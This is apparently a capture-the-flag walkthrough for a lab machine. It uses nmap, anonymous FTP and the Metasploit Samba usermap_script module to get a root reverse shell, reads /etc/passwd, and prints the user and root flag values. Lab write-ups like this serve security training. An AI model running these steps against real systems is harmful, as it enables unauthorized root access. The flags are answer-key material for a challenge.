We start with our Nmap scan:sudo nmap -sC -sV -p- --min-rate 5000 (target ip).

We find multiple open tcp ports: 21,22,139,445, and 3632. 

We notice that port 21 is a ftp port with anonymous login. This means that if we provided the username as "Anonymous" and any password, we will be in.

So, we will do:ftp (target ip).

There is nothing in the server.

We need to search for another exploit. We know that Samba 3.0.20-Debian is running on the port 445.

We will search for exploits for this server: search sploit Samba 3.0.20-Debian. We will get multiple results but we are interested in:Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit).

We will run Metasploit to exploit this version of Samba.

After launching Metasploit, we will again search for the same version of Samba so we know what we are going to use: search Samba 3.0.20.

We will get the name of the exploit that we are going to use: exploit/multi/samba/usermap_script.

Next, we will do: use exploit/multi/samba/usermap_script.

We will set the RHOST which is the ip of the target machine and also need to set LHOST which is our ip.

set RHOST (ip target machine)

set LHOST ( our ip).

then, we simply do: exploit.

This will give us a reverse shell as root. 

However, what we get is a dumb shell. To get a more functional shell we do: shell.

Now that we have a functional shell, we can list the users so we can get the user flag. We can list the users by: cat /etc/passwd. This will give us the username of makis. 

We can get the user flag from: /home/makis/user.txt

user flag: 14cd1b3b16964a1d1b36d38d880b6f02.

We can get the root flag from: /root/root.txt

root flag: e7f28f06795766dadb764740271015b5.
